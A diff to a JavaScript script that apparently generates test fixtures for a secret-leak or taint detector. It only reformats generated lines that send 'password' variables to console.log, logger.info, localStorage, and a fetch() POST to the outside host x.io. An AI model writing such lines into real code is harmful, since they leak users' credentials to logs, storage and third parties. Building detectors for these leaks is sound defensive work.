@@ -16,7 +16,7 @@ const lines = [
 ];
 
 for (let source = 0; source < sourceCount; source += 1) {
-  lines.push(`const password${source}=0;`);
+  lines.push(`const password${source} = 0;`);
 }
 
 for (let source = 0; source < sourceCount; source += 1) {
@@ -24,8 +24,8 @@ for (let source = 0; source < sourceCount; source += 1) {
     const value = `password${source}`;
     lines.push(`console.log(${value});`);
     lines.push(`logger.info(${value});`);
-    lines.push(`fetch(\"https://x.io\",{body:${value}});`);
-    lines.push(`localStorage.setItem(\"p\",${value});`);
+    lines.push(`fetch(\"https://x.io\", { body: ${value} });`);
+    lines.push(`localStorage.setItem(\"p\", ${value});`);
   }
 }
 
